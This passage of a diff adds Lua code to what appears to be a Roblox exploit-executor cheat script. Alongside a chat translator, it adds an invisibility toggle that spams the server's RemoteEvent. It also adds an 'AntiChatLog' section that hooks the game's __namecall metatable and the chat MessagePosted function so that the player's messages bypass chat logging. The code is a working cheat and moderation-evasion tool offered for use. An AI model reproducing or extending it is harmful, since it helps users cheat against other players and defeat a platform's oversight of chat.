+for i, plr in ipairs(Players:GetPlayers()) do
+    plr.Chatted:Connect(function(msg)
+        get(plr, msg)
+    end)
+end
+Players.PlayerAdded:Connect(function(plr)
+    plr.Chatted:Connect(function(msg)
+        get(plr, msg)
+    end)
+end)
+
+local sendEnabled = false
+local target = ""
+
+function translateTo(message, target)
+    target = target:lower() 
+    local translation = translate(message, target, "auto")
+
+    return translation.text
+end
+
+function disableSend()
+    sendEnabled = false
+    properties.Text = "[TR] Sending Disabled"
+    StarterGui:SetCore("ChatMakeSystemMessage", properties)
+end
+
+local CBar, CRemote, Connected = LP['PlayerGui']:WaitForChild('Chat')['Frame'].ChatBarParentFrame['Frame'].BoxFrame['Frame'].ChatBar, game:GetService('ReplicatedStorage').DefaultChatSystemChatEvents['SayMessageRequest'], {}
+
+local HookChat = function(Bar)
+    coroutine.wrap(function()
+        if not table.find(Connected,Bar) then
+            local Connect = Bar['FocusLost']:Connect(function(Enter)
+                if Enter ~= false and Bar['Text'] ~= '' then
+                    local Message = Bar['Text']
+                    Bar['Text'] = '';
+                    if Message == ">d" then
+                        disableSend()
+                    elseif Message:sub(1,1) == ">" and not Message:find(" ") then
+                        if getISOCode(Message:sub(2)) then
+                            sendEnabled = true
+                            target = Message:sub(2)
+                        else
+                            properties.Text = "[TR] Invalid language"
+                            StarterGui:SetCore("ChatMakeSystemMessage", properties)
+                        end
+                    elseif sendEnabled then
+                        Message = translateTo(Message, target)
+                        if not _G.SecureChat then
+                            game:GetService('Players'):Chat(Message); 
+                        end
+                        CRemote:FireServer(Message,'All')
+                    else
+                        if not _G.SecureChat then
+                            game:GetService('Players'):Chat(Message); 
+                        end
+                        CRemote:FireServer(Message,'All')
+                    end
+                end
+            end)
+            Connected[#Connected+1] = Bar; Bar['AncestryChanged']:Wait(); Connect:Disconnect()
+        end
+    end)()
+end
+
+HookChat(CBar); local BindHook = Instance.new('BindableEvent')
+
+local MT = getrawmetatable(game); local NC = MT.__namecall; setreadonly(MT, false)
+
+MT.__namecall = newcclosure(function(...)
+    local Method, Args = getnamecallmethod(), {...}
+    if rawequal(tostring(Args[1]),'ChatBarFocusChanged') and rawequal(Args[2],true) then 
+        if LP['PlayerGui']:FindFirstChild('Chat') then
+            BindHook:Fire()
+        end
+    end
+    return NC(...)
+end)
+
+BindHook['Event']:Connect(function()
+    CBar = LP['PlayerGui'].Chat['Frame'].ChatBarParentFrame['Frame'].BoxFrame['Frame'].ChatBar
+    HookChat(CBar)
+end)
+SolarisLib:Notification("Переводчик будет переводить всё языки на русские слова, для переключение между язывами напишите в чат '>en' или '>ru'")
+end)
+
+local toggle = f:Toggle("Invisibl", false,"Toggle", function(ar)
+    auu = ar
+    while auu do task.wait()
+        pcall(function()
+   game.ReplicatedStorage.RemoteEvent:FireServer({"Skill_Invisible","Start"})
+        end)
+end
+end)
+
+
+
+
+
+--AntiChatLog
+local mt = getrawmetatable(game)
+local old = mt.__namecall
+setreadonly(mt, false)
+   
+mt.__namecall = newcclosure(function(self, ...)
+
+   local args = {...}
+   local method = getnamecallmethod()
+
+   if method == "Fire" and self.Name == "MessagePosted" then
+       return wait(9e9)
+   end
+
+   return old(self, ...)
+
+end)
+
+
+local CloneFunction = clonefunction
+local CheckCaller = CloneFunction(checkcaller)
+local HookFunction = CloneFunction(hookfunction)
+local LocalPlayer = game.Players.PlayerAdded:wait()
+
+local PostMessage = require(LocalPlayer:WaitForChild("PlayerScripts", 1/0):WaitForChild("ChatScript", 1/0):WaitForChild("ChatMain", 1/0)).MessagePosted
+getgenv().MessageEvent = Instance.new("BindableEvent")
+
+local OldFunctionHook
+local PostMessageHook = function(self, msg)
+   if not CheckCaller() and self == PostMessage then
+       MessageEvent:Fire(msg)
+       return
+   end
+   return OldFunctionHook(self, msg)
+end
+OldFunctionHook = HookFunction(PostMessage.fire, PostMessageHook)
+--AntiChatLog
